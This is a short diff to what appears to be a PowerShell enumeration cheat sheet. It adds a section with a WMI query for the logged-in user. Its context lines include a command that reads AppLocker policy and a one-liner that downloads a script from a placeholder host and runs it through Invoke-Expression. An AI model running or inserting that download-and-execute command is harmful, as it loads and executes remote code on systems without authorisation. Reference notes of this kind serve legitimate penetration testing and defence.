@@ -57,3 +57,11 @@ Invoke-Expression -Command (Invoke-WebRequest -Uri 'http://ipaddress/script.ps1'
 ```powershell
 Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
 ```
+
+### Users
+
+- Who is logged in?
+```powershell
+Get-WmiObject -Class Win32_ComputerSystem | Select-Object -ExpandProperty UserName
+```
+
